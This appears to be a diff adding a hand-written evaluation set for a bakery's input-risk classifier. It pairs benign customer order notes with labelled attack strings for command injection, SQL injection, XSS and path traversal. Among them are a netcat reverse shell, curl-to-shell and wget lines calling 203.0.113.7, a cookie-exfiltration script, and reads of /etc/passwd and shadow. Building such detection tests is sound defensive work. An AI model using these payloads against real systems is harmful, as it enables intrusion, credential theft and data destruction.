@@ -1,0 +1,76 @@
+# Hand-written shop-customer evaluation set (input-risk v2). NEVER used for training.
+# Normal: what real customers type into a bakery's contact / order-note / address fields, including the punctuation
+# that v1 mistook for SQL (--, ;, quotes, #). Attacks: the same fields carrying a payload.
+# The first two normals are the live false positives found through the divert proxy on 2026-11-01.
+
+normal:
+  - "Mom's cake; less sugar -- urgent"
+  - "Order #4521 -- can you deliver after 6pm?"
+  - "Hi! Need a 1kg chocolate truffle for Saturday -- eggless please"
+  - "Can you write 'Happy 50th, Dad' on top?"
+  - "Delivery to Flat 4B; ring twice -- dog is friendly"
+  - "Order #77812 arrived late; cake was fine though"
+  - "Is the red velvet available or should I pick blueberry?"
+  - "Pls call before coming -- gate code 4512#"
+  - "No nuts!!! My son is allergic"
+  - "Two boxes of brownies & one cheesecake"
+  - "Budget around ₹1500 -- what do you suggest?"
+  - "Cake for 20 people; theme: Frozen (Elsa)"
+  - "Can I change my order #5521? Wrong date selected"
+  - "It's my wife's b'day tomorrow -- surprise, don't call her"
+  - "Leave at reception; I'm in a meeting till 7"
+  - "Address: 12/3, Shivaji Nagar, Pune -- near the temple"
+  - "Do you have sugar-free options? Diabetic grandpa :)"
+  - "Order 1234 or 1235, not sure which -- both mine"
+  - "Select the pineapple one, drop the extra candles"
+  - "Payment failed twice; tried UPI & card"
+  - "\"Best cake ever\" -- please share the recipe? jk"
+  - "Need it by 5:30 pm sharp!! party starts at 6"
+  - "Write: Congrats Riya & Arjun <3"
+  - "Half chocolate / half vanilla, possible?"
+  - "Is delivery free above ₹999? -- asking for bulk order"
+  - "Sorry for the late reply; yes, go ahead with #2"
+  - "O'Brien family order, 3 cupcakes -- pickup"
+  - "Remove the 'eggless' tag, we want regular"
+  - "Change address to D'Souza Villa, Bandra (W)"
+  - "Price > 2000 is fine; quality matters more"
+  - "Can I get a refund for order #66120? Cake was damaged"
+  - "Kids party -- 15 kids, 5 adults; cupcakes or cake?"
+  - "Note: don't add fondant; buttercream only"
+  - "Customer since 2023 -- any loyalty discount?"
+  - "Union Bank card got declined, will pay cash"
+  - "Can the message be 'Get well soon, Nani'?"
+  - "Pickup at 4; if late, keep it in the fridge"
+  - "1 x Biscoff cheesecake + 2 x choco chip boxes"
+  - "Is 'Belgian chocolate' real Belgian?"
+  - "Thanks!!! Loved it -- 5 stars"
+
+cmd_injection:
+  - "Happy birthday; cat /etc/passwd"
+  - "Flat 4B && id"
+  - "order note | nc 203.0.113.7 4444 -e /bin/sh"
+  - "less sugar $(curl http://203.0.113.7/x.sh | sh)"
+  - "Riya`whoami`"
+  - "test; wget http://203.0.113.7/a -O /tmp/a"
+
+sqli:
+  - "Mom's cake' OR '1'='1"
+  - "Order #4521' UNION SELECT username,password FROM users--"
+  - "riya@gmail.com'; DROP TABLE orders;--"
+  - "1' AND SLEEP(5)--"
+  - "admin'--"
+  - "x' OR 1=1 LIMIT 1;--"
+
+xss:
+  - "<script>alert(1)</script>"
+  - "Happy birthday <img src=x onerror=alert(1)>"
+  - "<svg/onload=alert(document.cookie)>"
+  - "Riya\"><script>fetch('//203.0.113.7/'+document.cookie)</script>"
+  - "<iframe src=javascript:alert(1)>"
+  - "cake <body onload=alert('x')>"
+
+path_traversal:
+  - "../../../../etc/passwd"
+  - "..\\..\\windows\\win.ini"
+  - "%2e%2e%2f%2e%2e%2fetc%2fshadow"
+  - "images/../../../../proc/self/environ"
